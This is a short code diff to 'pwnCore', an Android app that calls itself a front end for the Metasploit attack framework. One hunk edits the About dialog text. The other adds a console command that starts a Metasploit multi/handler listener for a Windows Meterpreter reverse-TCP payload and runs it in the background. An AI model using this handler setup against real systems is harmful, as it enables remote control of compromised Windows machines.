@@ -266,11 +266,10 @@ public class MainActivity extends Activity implements OnQueryTextListener {
 	    	return true;
 	    	
 	    case R.id.mnuAbout:
-	    	String msgbox_string = 	"pwnCore v1.0.0\n" + 
+	    	String msgbox_string = 	"pwnCore v1.0b\n" + 
 					"Android Cyber Attack Management tool for Metasploit\n\n" +
-					"By: Anwar Mohamed\n" + 
-					"anwarelmakrahy@gmail.com\n\n" + 
-					"Copyrights 2013 to Anwar Mohamed\n";
+					"Anwar Mohamed\n" + 
+					"anwarelmakrahy@gmail.com\n\n";
 
 			AlertDialog dlg = new AlertDialog.Builder(this).create();
 			dlg.setMessage(msgbox_string);
@@ -333,6 +332,10 @@ public class MainActivity extends Activity implements OnQueryTextListener {
 	    	Intent intent = new Intent(getApplicationContext(), ConsoleActivity.class);
 	    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 	    	intent.putExtra("type", "new.console");
+	    	intent.putExtra("cmd", "use multi/handler\n" +
+	    					"set PAYLOAD windows/meterpreter/reverse_tcp\n" +
+	    					"set LHOST " + con_txtHost + "\n" + 
+	    					"exploit -z");
 	    	startActivity(intent);   
 	    	
 	    	return true;
